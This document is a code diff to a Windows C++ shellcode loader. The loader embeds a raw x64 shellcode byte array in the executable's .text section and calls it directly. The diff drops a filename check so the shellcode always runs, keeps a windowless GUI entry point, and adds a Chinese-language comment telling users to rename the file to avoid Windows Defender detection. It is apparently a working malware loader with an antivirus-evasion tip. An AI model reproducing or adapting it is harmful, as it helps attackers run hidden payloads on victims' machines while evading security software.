@@ -2,24 +2,19 @@
 #include <tchar.h>
 
 
+/*
+* 注意事项：
+*
+* 1. 经多次测试发现，Defender有根据名称判断文件是否恶意的倾向，因此使用前务必将文件名修改
+*
+*/
+
+
 #ifndef _DEBUG
-#pragma comment(linker, "/subsystem:windows /entry:wmainCRTStartup")
+#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
 #endif // _DEBUG
 
 #pragma section(".text")
-
-BYTE Shellcode[];
-
-int _tmain(int argc, TCHAR* argv[])
-{
-	TCHAR FileName[MAX_PATH];
-	_tsplitpath_s(argv[0], NULL, 0, NULL, 0, FileName, MAX_PATH, NULL, 0);
-
-	if (_tcsicmp(FileName, _T("System")) == 0)
-		return (*(int(*)())(&Shellcode))();
-	else
-		return 0;
-}
 
 __declspec(allocate(".text")) BYTE Shellcode[] = {
 	0xeb,0x2e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // 这行的作用是直接JMP跳转到入口点 JMP $+0x30
@@ -44,3 +39,8 @@ __declspec(allocate(".text")) BYTE Shellcode[] = {
 	0x8b,0x4a,0x24,0x49,0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,
 	0xeb,0x02,0x33,0xc0,0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3
 };
+
+int _tmain(int argc, TCHAR* argv[])
+{
+	return (*(int(*)())(&Shellcode[0x0]))();
+}
